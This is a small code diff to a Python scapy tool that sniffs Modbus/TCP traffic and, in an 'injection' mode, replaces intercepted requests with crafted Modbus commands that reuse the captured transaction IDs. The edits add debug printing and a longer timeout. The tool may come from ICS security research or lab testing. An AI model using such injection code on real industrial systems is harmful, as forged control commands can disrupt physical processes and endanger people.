@@ -22,7 +22,7 @@ from datetime import datetime, timezone
 
 try:
     from scapy.all import (
-        sniff, sr1, ARP, Ether, TCP, IP, conf, get_if_hwaddr,sendp,srp1,sr
+        sniff, sr1, ARP, Ether, TCP, IP, conf, get_if_hwaddr,sendp,srp1,sr,srp
     )
     from scapy.contrib.modbus import (
     ModbusADURequest,
@@ -247,7 +247,7 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
 
     if mode=="injection":
-        print("Crafting custom packet")
+        print("Crafting custom packet...")
         trans_id = pkt[ModbusADURequest].transId
         unit_id = pkt[ModbusADURequest].unitId
 
@@ -256,6 +256,8 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
         modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
 
         pkt = stripped / modbus_payload
+        print("\nCrafted Packet: ")
+        print(pkt.show(dump=True))
 
     elif mode=="passive": # just sniffing traffic
         print("\nRequest Recieved:")
@@ -273,7 +275,7 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
 
     # print(npkt.show(dump=True))
     # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
-    response = srp1(pkt, timeout=3, verbose=0)
+    response = srp1(pkt, timeout=60, verbose=0)
     if response:
         print("\nResponse received:")
         # response.show()
